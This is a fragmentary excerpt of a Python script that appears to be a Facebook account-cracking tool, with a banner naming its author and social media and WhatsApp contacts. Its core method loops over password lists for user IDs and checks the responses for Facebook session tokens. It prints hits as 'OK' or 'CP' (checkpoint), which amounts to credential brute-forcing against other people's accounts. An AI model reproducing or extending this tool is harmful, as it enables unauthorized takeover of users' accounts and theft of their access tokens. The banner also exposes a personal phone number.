...
\33[1;96m╠══[Author   : AHMADO X PODARI

\33[1;96m╠══[FACEBOOK : AHMADO PODARI  

\33[1;96m╠══[WHATSAPP : +1(647)374-5886     

\33[1;96m╠══[STATUS   : OLD CRACK          

\33[1;96m╠══[VERSION  : 1.8          
...
def main():
	...
	os.system('xdg-open https://www.facebook.com/profile.php?id=100022553810709')
	...
	print('\033[1;97m[4] FOLLOWE MY SECOND ACCOUNT')
...
def Ahmado():
	...
	if input == '1':
		...
		os.system('xdg-open https://wa.me/+1647374-5886 ')

		main()

	elif input == '4':

		os.system("xdg-open https://www.facebook.com/sajanali.otho.5/")
	...
	def __api__(self, uid, pwx):
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				print("\033[1;97m[\033[1;92mAHMADO-OK\033[1;97m]\033[1;92m %s | %s\033[0;92m"%(uid, pw))
				...
				print("\033[1;97m[\033[1;91mAHMADO-CP\033[1;97m] %s | %s\033[0;97m"%(uid, pw))
